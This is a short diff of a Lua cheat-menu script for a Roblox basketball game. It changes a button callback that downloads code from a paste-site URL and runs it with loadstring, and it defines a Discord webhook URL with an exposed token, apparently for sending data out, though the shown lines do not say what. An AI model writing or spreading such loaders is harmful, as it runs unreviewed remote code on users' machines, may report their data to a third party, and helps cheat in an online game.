@@ -135,7 +135,7 @@ local Tab = Window:CreateTab("Hoopz", 4483362458) -- Title, Image
  local Button = Tab:CreateButton({
     Name = "Load Hoopz Script (credits to Eon Hub)",
     Callback = function()
-        loadstring(game:HttpGet("https://pastefy.app/UmwMXvUd/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/Ux7y7VUc/raw"))()
         local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
  
